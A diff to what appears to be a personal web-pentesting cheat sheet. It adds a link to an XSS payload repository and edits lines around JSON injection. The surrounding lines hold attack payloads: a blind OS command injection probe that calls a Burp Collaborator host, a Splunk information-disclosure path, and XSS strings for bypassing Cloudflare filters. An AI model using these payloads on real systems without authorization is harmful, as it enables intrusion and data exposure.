@@ -36,7 +36,7 @@
 32- when directory fails 401 unauthorized then use tool (davtest)
 33- en-US/splunkd/_raw/services/server/info/server-info?output_mode=json ==> for splunk information disclosure
 34- if found feedback email put hossam||ping+burpcollaborator+||  ==> if there is any interaction then => Blind OS command injection with out-of-band interaction
-
+35- 
 
 
 google dorks :   
@@ -90,7 +90,8 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
   ----------------------------------------------------------------------------------------------
                     JSON EXPLOIT
   
-  inject json value of request with xss 
+  inject json value of request with 
+  
   {"description":"<script>alert(\"hossam\")"}
   try to change the method from get to put to inject database
   
@@ -319,7 +320,9 @@ login
 
 --------------------------------------------------------------------------------------------------
             (((XSS))
- - <script>alert(\"hossam\")</script>        // add \ before " to escape filter
+ https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
+            
+- <script>alert(\"hossam\")</script>        // add \ before " to escape filter
 - cloudflare bypass 
 "-alert(0)-"		X
 "-top['al\x65rt'](9)-"	good
